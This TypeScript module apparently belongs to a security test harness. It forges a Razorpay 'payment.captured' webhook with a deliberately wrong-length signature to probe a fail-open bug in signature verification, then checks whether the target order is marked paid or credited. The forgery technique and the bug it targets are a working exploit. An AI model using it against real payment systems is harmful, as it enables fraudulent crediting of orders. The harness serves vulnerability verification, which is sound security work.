import crypto from "crypto";
import type { AttackResult } from "./types.ts";
import { buildWebhookPayload, readOrderState, sendWebhook, setupAuthorized } from "./util.ts";

// Deliberately the wrong LENGTH (not just wrong content) — a same-length
// forgery is correctly rejected by a real timingSafeEqual comparison. This
// exploits the fail-open bug where a length mismatch makes the comparison
// throw and the catch treats that as valid.
const WRONG_LENGTH_SIGNATURE = "invalid";

/**
 * POSTs a webhook with a signature of the wrong length (not wrong content).
 * Succeeded = the webhook was accepted (200) AND actually processed —
 * verified by reading real state change on the order status page, not by
 * trusting the 200 alone.
 */
export async function forgedSignature(
  targetUrl: string,
  orderId: string,
  amountPaise: number,
): Promise<AttackResult> {
  await setupAuthorized(targetUrl, orderId, amountPaise);
  const baseline = await readOrderState(targetUrl, orderId);

  const rawBody = buildWebhookPayload("payment.captured", orderId, amountPaise);
  const eventId = `evt_forged_${crypto.randomUUID()}`;

  const delivery = await sendWebhook(targetUrl, rawBody, WRONG_LENGTH_SIGNATURE, eventId);
  const after = await readOrderState(targetUrl, orderId);

  const creditedIncreased =
    baseline.creditedAmountRupees !== null &&
    after.creditedAmountRupees !== null &&
    after.creditedAmountRupees > baseline.creditedAmountRupees;
  const becamePaid = baseline.status !== "paid" && after.status === "paid";

  const succeeded = delivery.httpStatus === 200 && (creditedIncreased || becamePaid);

  const details = succeeded
    ? `payment.captured sent with x-razorpay-signature: "${WRONG_LENGTH_SIGNATURE}" (length ${WRONG_LENGTH_SIGNATURE.length}, not the real 64-char hex digest) returned ${delivery.httpStatus} (${delivery.body}); order state moved from status="${baseline.status}"/credited=${fmt(baseline.creditedAmountRupees)} to status="${after.status}"/credited=${fmt(after.creditedAmountRupees)} — accepted and processed with a garbage signature.`
    : `payment.captured sent with x-razorpay-signature: "${WRONG_LENGTH_SIGNATURE}" (length ${WRONG_LENGTH_SIGNATURE.length}) returned ${delivery.httpStatus} (${delivery.body}); order state stayed status="${after.status}"/credited=${fmt(after.creditedAmountRupees)} — the forged signature was rejected.`;

  return {
    attackName: "forgedSignature",
    succeeded,
    details,
    httpStatus: delivery.httpStatus,
    targetUrl,
  };
}

function fmt(v: number | null): string {
  return v === null ? "n/a" : `₹${v}`;
}
